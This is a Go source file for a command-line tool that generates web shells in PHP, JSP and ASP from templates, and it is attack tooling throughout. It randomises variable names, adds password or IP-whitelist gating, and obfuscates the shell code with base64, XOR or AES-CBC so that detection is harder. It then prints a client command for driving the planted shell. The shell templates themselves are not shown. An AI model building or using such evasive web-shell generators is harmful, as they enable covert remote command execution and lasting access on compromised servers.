package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"os"
	"regexp"
	"strings"
	"text/template"
	"time"
)

var (
	lang           string
	cmdParam       string
	cmdHeader      string
	method         string
	whitelist      string
	password       string
	passwordHeader string
	passwordParam  string
	encMethod      string
	encHeader      string
	encParam       string
	encKey         string
	encIV          string
	b64            bool
	fileCap        bool
	minify         bool
	seededRand     *rand.Rand
)

func init() {
	flag.StringVar(&lang, "type", "", "Shell types: (PHP, JSP, ASP)")
	flag.StringVar(&cmdParam, "param", "c", "Command parameter name")
	flag.StringVar(&cmdHeader, "header", "", "Command header")
	flag.StringVar(&method, "X", "GET", "HTTP method (GET,POST,PUT,PATCH,DELETE)")
	flag.StringVar(&whitelist, "whitelist", "", "Whitelist protect shell")
	flag.StringVar(&password, "pass", "", "Password protect shell")
	flag.StringVar(&passwordParam, "pass-param", "", "Password parameter")
	flag.StringVar(&passwordHeader, "pass-header", "", "Password header")
	flag.StringVar(&encMethod, "enc", "", "Encoding/encryption method (b64,xor,aes)")
	flag.StringVar(&encParam, "enc-param", "", "Encoding/encryption parameter")
	flag.StringVar(&encHeader, "enc-header", "", "Encoding/encryption header")
	flag.StringVar(&encKey, "enc-key", "", "Encryption key")
	flag.StringVar(&encIV, "enc-iv", "", "Encryption IV")
	flag.BoolVar(&b64, "b64", false, "Base64 encode final payload")
	flag.BoolVar(&fileCap, "f", false, "Include wsh's file transfer capabilities")
	flag.BoolVar(&minify, "min", false, "Minify code")

	flag.Parse()

	if lang == "" {
		flag.Usage()
		fmt.Println("-type required")
		os.Exit(1)
	}

	seededRand = rand.New(rand.NewSource(time.Now().UnixNano()))
}

func main() {
	varNames := []string{}
	for i := 0; i < 50; i++ {
		varNames = append(varNames, genVarName(5, 10))
	}
	varNames = unique(varNames)

	vNameMin := 3
	vNameMax := 7
	vNames := map[string]string{
		"cmd": genVarName(vNameMin, vNameMax), //php,jsp

		"whitelist": genVarName(vNameMin, vNameMax), //php,jsp

		"hash":     genVarName(vNameMin, vNameMax), //php,jsp
		"pass":     genVarName(vNameMin, vNameMax), //php,jsp
		"alg":      genVarName(vNameMin, vNameMax), //jsp
		"hashFunc": genVarName(vNameMin, vNameMax), //jsp
		"digest":   genVarName(vNameMin, vNameMax), //jsp
		"asc":      genVarName(vNameMin, vNameMax), //asp

		"cmdArgs":      genVarName(vNameMin, vNameMax), //php,jsp
		"filePath":     genVarName(vNameMin, vNameMax), //php,jsp
		"file":         genVarName(vNameMin, vNameMax), //jsp
		"fileStream":   genVarName(vNameMin, vNameMax), //jsp
		"fileContents": genVarName(vNameMin, vNameMax), //jsp
		"mimeType":     genVarName(vNameMin, vNameMax), //jsp
		"outStream":    genVarName(vNameMin, vNameMax), //jsp
		"buffer":       genVarName(vNameMin, vNameMax), //jsp
		"bytesRead":    genVarName(vNameMin, vNameMax), //jsp
		"destPath":     genVarName(vNameMin, vNameMax), //php
		"fs":           genVarName(vNameMin, vNameMax), //php

		"encKey":    genVarName(vNameMin, vNameMax), //php
		"encSrc":    genVarName(vNameMin, vNameMax), //php
		"dSrc":      genVarName(vNameMin, vNameMax), //php
		"process":   genVarName(vNameMin, vNameMax), //jsp
		"output":    genVarName(vNameMin, vNameMax), //jsp
		"encObj":    genVarName(vNameMin, vNameMax), //asp
		"b64":       genVarName(vNameMin, vNameMax), //asp
		"binStream": genVarName(vNameMin, vNameMax), //asp
		"keyChar":   genVarName(vNameMin, vNameMax), //asp

		"i":         genVarName(vNameMin, vNameMax), //php
		"ii":        genVarName(vNameMin, vNameMax), //php
		"msxmlVar":  genVarName(vNameMin, vNameMax), //asp
		"base64Var": genVarName(vNameMin, vNameMax), //asp

	}

	d := ShellData{
		Method:           method,
		CmdParam:         cmdParam,
		CmdHeader:        cmdHeader,
		Whitelist:        whitelist,
		Password:         password,
		PasswordParam:    passwordParam,
		PasswordHeader:   passwordHeader,
		EncMethod:        encMethod,
		EncParam:         encParam,
		EncHeader:        encHeader,
		EncKey:           encKey,
		FileCapabilities: fileCap,
		VarNames:         varNames,
		V:                vNames,
	}

	// Parse csv whitelist
	if whitelist != "" {
		// whitelist = strings.TrimSpace(whitelist)
		whitelist = strings.Trim(whitelist, " ,")
		whitelist = strings.ReplaceAll(whitelist, ",", "\",\"")
		d.Whitelist = fmt.Sprintf("\"%s\"", whitelist)
	}

	// Password protect
	if password != "" {
		if passwordParam == cmdParam {
			fmt.Println("Command parameter and passord parameter must be unique")
			os.Exit(1)
		}

		hash := md5.Sum([]byte(password))
		d.PasswordHash = hex.EncodeToString(hash[:])
		d.PasswordHeader = passwordHeader
	}

	// If encoding/encrypting
	if encMethod != "" {
		d.EncMethod = encMethod
		d.EncHeader = encHeader
		d.EncParam = encParam
	}

	// Fix php/asp headers
	if lang == "php" || lang == "asp" {
		d.PasswordHeader = fmtHeader(passwordHeader)
		d.EncHeader = fmtHeader(encHeader)
		d.CmdHeader = fmtHeader(cmdHeader)
	}

	// Load template
	tmpl, err := template.ParseFiles(fmt.Sprintf("templates/%s.tml", lang))
	if err != nil {
		fmt.Println("")
	}

	// Parse template into code
	buf := new(bytes.Buffer)
	err = tmpl.Execute(buf, d)
	if err != nil {
		panic(err)
	}
	code := buf.String()
	buf.Reset()

	r := regexp.MustCompile("[\n\n]{2,}")
	code = r.ReplaceAllString(code, "\n")

	// Minify code
	if minify || encMethod != "" {
		r := regexp.MustCompile("[ \n\n]{2,}")
		code = r.ReplaceAllString(code, "\n")
		if lang == "php" {
			code = strings.ReplaceAll(code, "\n", "")
		} else if lang == "asp" {
			// code = strings.ReplaceAll(code, " ", "")
			// code = strings.Trim(code, " \n\n")
			// code = strings.ReplaceAll(code, "\n", "; ")
		}
	}

	// If using encoding/encryption
	if encMethod == "b64" {
		code = base64.StdEncoding.EncodeToString([]byte(code))
		code = strings.ReplaceAll(code, string('\x10'), "")
		d.EncCode = code
		err := tmpl.ExecuteTemplate(buf, "b64", d)
		if err != nil {
			panic(err)
		}

		code = buf.String()
		buf.Reset()

	} else if encMethod == "xor" {
		code = xor(code, encKey)
		code = base64.StdEncoding.EncodeToString([]byte(code))
		d.EncCode = code
		err := tmpl.ExecuteTemplate(buf, "xor", d)
		if err != nil {
			panic(err)
		}

		code = buf.String()
		buf.Reset()

	} else if encMethod == "aes" {
		keyBytes := sha256.Sum256([]byte(encKey))
		ivBytes := sha256.Sum256([]byte(encIV))
		code = aes256(code, keyBytes, ivBytes, 16)
		// code = base64.StdEncoding.EncodeToString([]byte(code))
		d.EncCode = code
		err := tmpl.ExecuteTemplate(buf, "aes", d)
		if err != nil {
			panic(err)
		}

		code = buf.String()
		buf.Reset()
	}

	// If base64 encoding final payload
	if b64 {
		code = base64.StdEncoding.EncodeToString([]byte(code))
		d.EncCode = code
		err := tmpl.ExecuteTemplate(buf, "b64", d)
		if err != nil {
			panic(err)
		}

		code = buf.String()
		buf.Reset()
	}

	// Add opening and closing brackets
	if lang == "php" {
		code = fmt.Sprintf("<?php %s?>", code)
	} else if lang == "asp" {
		code = fmt.Sprintf("<%%%s%%>", code)
	} else if lang == "jsp" {
		// code = fmt.Sprintf("<%%@ page import=\"java.util.*,java.io.*\"%%>\n<%%\n%s\n%%>", code)
	}

	fmt.Println(code)

	wshCmd := buildCommand()
	log.Println(wshCmd)

}

type ShellData struct {
	Method           string
	CmdParam         string
	CmdHeader        string
	Whitelist        string
	Password         string
	PasswordParam    string
	PasswordHeader   string
	PasswordHash     string
	EncMethod        string
	EncParam         string
	EncHeader        string
	EncKey           string
	EncCode          string
	FileCapabilities bool
	VarNames         []string
	V                map[string]string
}

func xor(s, key string) (output string) {
	for i := 0; i < len(s); i++ {
		output += string(s[i] ^ key[i%len(key)])
	}
	return output
}

func aes256(s string, key, iv [32]byte, blockSize int) (output string) {
	log.Println(s)
	bKey := []byte(key[:])
	bIV := []byte(iv[:blockSize])
	log.Printf("%s\n", bIV)
	log.Printf("IV: %x, %d %d", bIV, len(bIV), blockSize)
	bPlaintext := PKCS5Padding([]byte(s), blockSize, len(s))
	block, _ := aes.NewCipher(bKey)
	ciphertext := make([]byte, len(bPlaintext))
	mode := cipher.NewCBCEncrypter(block, bIV)
	mode.CryptBlocks(ciphertext, bPlaintext)
	return hex.EncodeToString(ciphertext)
}

func PKCS5Padding(ciphertext []byte, blockSize, after int) []byte {
	padding := (blockSize - len(ciphertext)%blockSize)
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func fmtHeader(h string) string {
	h = strings.ReplaceAll(h, "-", "_")
	h = strings.ToUpper(h)
	return h
}

func buildCommand() string {
	c := "wsh "
	c += fmt.Sprintf("-X %s ", method)

	if cmdParam != "" {
		c += fmt.Sprintf("-param %s ", cmdParam)
	} else if cmdHeader != "" {
		c += fmt.Sprintf("-header %s ", cmdHeader)
	}

	if passwordParam != "" {
		c += fmt.Sprintf("-P '%s:%s' ", passwordParam, password)
	} else if passwordHeader != "" {
		c += fmt.Sprintf("-H '%s:%s' ", passwordHeader, password)
	}

	if encParam != "" {
		c += fmt.Sprintf("-P '%s:%s' ", encParam, encKey)
	} else if encHeader != "" {
		c += fmt.Sprintf("-H '%s:%s' ", encHeader, encKey)
	}

	c += "-url "

	return c
}

func genVarName(min, max int) string {
	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	l := seededRand.Intn(max-min) + min
	b := make([]byte, l)
	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}
	name := string(b)
	if lang == "php" {
		name = "$" + name
	}
	return name
}

func unique(slice []string) []string {
	keys := make(map[string]bool)
	list := []string{}
	for _, entry := range slice {
		if _, value := keys[entry]; !value {
			keys[entry] = true
			list = append(list, entry)
		}
	}
	return list
}
